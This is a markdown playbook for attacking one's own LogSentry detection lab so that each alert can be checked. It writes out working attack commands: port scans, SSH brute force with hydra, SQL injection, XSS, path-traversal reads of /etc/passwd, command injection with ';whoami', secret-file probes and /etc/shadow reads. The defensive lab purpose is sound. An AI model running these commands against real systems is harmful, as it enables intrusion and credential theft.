# Attack playbook

How to attack **your own** LogSentry lab and check each detection fires.

> ⚠️ **Only run these against servers you own** (the ones Terraform created for you). Scanning or attacking anyone else's systems is illegal in Canada (Criminal Code s. 342.1) and most other countries, and against AWS's terms. AWS allows security testing of your own EC2 instances without prior approval, as long as you stay within their [penetration testing policy](https://aws.amazon.com/security/penetration-testing/) (no DoS/flooding).

Tools: `nmap`, `hydra`, `gobuster`, `sqlmap`, `curl`. On Kali Linux they're preinstalled; on Ubuntu: `sudo apt install nmap hydra gobuster sqlmap`. Run them from the IP you put in `my_ip_cidr` / `attacker_cidr`.

Set the targets (from `terraform output`):

```bash
WEB=15.156.x.x        # web-01
BASTION=3.98.x.x
```

Each test lists the alert you should see and roughly how fast. For a record of results, take a screenshot of the dashboard after each one.

---

### 1. Port scan → *Port scan detected* (T1046)

```bash
nmap -sS -T4 --top-ports 200 $BASTION        # needs sudo for -sS; or use -sT
```

Every SYN to a closed port is logged by the UFW rule and forwarded. Expect an alert within about a second of crossing 15 ports.

### 2. SSH brute force → *SSH brute-force attack* / *password spraying* (T1110)

The servers are key-only, so password tools like hydra stop immediately ("does not support password authentication"). You can still produce exactly what internet bots do, a burst of failed logins for many usernames:

```bash
for u in admin root test oracle guest pi ftpuser support; do
  ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o PubkeyAuthentication=no $u@$BASTION true
done
```

Each attempt is logged as `Connection closed by invalid user … [preauth]` and counted. Eight usernames from one IP → *SSH password spraying*. Repeat with a single username for *SSH brute-force attack*.

To use hydra with real passwords, set up the throwaway password user from test 7 first, then:

```bash
printf "123456\npassword\nletmein\nqwerty\nadmin\n" > pass.txt
hydra -l victim -P pass.txt -t 4 ssh://$BASTION
```

### 3. Web directory enumeration → *Web directory enumeration* (T1595.003)

```bash
gobuster dir -u http://$WEB -w /usr/share/wordlists/dirb/common.txt -t 10
```

The alert names gobuster from its user agent.

### 4. SQL injection → *SQL injection attempt* (T1190)

```bash
curl "http://$WEB/products?id=1%27%20OR%20%271%27%3D%271"
curl "http://$WEB/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users--"
sqlmap -u "http://$WEB/products?id=1" --batch --level 1 --risk 1
```

### 5. XSS, path traversal, command injection, secrets (T1190, T1083, T1059, T1552)

```bash
curl "http://$WEB/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
curl --path-as-is "http://$WEB/static/../../../../etc/passwd"
curl "http://$WEB/api/ping?host=127.0.0.1%3Bwhoami"
curl "http://$WEB/.env"
curl "http://$WEB/.git/config"
```

The default nginx page will just return 404s. That's fine: LogSentry detects the *attempt* from the request itself. Successful (2xx) responses are flagged as needing a closer look.

### 6. Privilege escalation (T1548.003)

SSH in to a target with your key and simulate an insider and a web shell:

```bash
ssh ubuntu@$WEB
sudo useradd -m intern
sudo -u intern sudo -n cat /etc/shadow      # → Unauthorized sudo attempt (intern isn't in sudoers)
sudo -u www-data sudo -n true               # → Unauthorized sudo attempt from the web server account
sudo bash -c 'id'                           # → Root shell or sensitive file access via sudo (low)
```

### 7. Account compromise → *Likely account compromise via SSH* (T1078, critical)

This needs password login, which the lab disables for safety. To test it, temporarily allow it for one throwaway user on **one** target, then turn it off again:

```bash
ssh ubuntu@$BASTION
sudo useradd -m victim && echo 'victim:Summer2026!' | sudo chpasswd
printf 'Match User victim\n  PasswordAuthentication yes\n' | sudo tee /etc/ssh/sshd_config.d/90-test.conf
sudo systemctl restart ssh
exit

# from your machine (needs sshpass: sudo apt install sshpass): 6 wrong passwords, then the right one
for i in 1 2 3 4 5 6; do sshpass -p wrong ssh -o StrictHostKeyChecking=no victim@$BASTION true; done
sshpass -p 'Summer2026!' ssh victim@$BASTION true      # → CRITICAL alert

# clean up immediately
ssh ubuntu@$BASTION 'sudo rm /etc/ssh/sshd_config.d/90-test.conf && sudo systemctl restart ssh && sudo userdel -r victim'
```

---

## Real-world traffic

Leave the lab running for an hour. SSH on port 22 is open to the internet, and automated bots find new IPs fast, so you'll usually see genuine brute-force alerts from IPs around the world without doing anything. The *Top attackers* table shows them. This is a good talking point: you can report how many real attacks hit an exposed server in its first 24 hours.

## Recording results

A simple table for your write-up:

| Attack | Tool | Alert | Severity | Detected in |
|---|---|---|---|---|
| Port scan | nmap -sS | Port scan detected | Medium | 0.3 s |
| … | | | | |

"Detected in" is shown on each alert in the dashboard (open the alert to see it).
